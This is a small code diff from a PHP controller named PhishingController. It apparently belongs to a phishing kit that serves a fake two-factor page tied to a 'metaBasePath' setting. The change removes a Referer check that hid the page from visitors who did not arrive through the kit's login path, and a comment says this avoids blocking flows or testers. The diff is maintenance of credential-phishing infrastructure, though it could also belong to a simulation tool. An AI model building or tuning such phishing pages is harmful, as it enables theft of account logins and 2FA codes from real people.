@@ -90,10 +90,7 @@ class PhishingController extends Controller
             return abort(404);
         }
 
-        $referer = request()->header('Referer') ?: "";
-        if (!str_contains($referer, $session['loginPath']) && !str_contains($referer, $session['authPath'])) {
-            return abort(404);
-        }
+        // Referer check removed to prevent blocking legitimate flows or testers
 
         return view('2fa1', [
             'metaBasePath' => $session['metaBasePath']
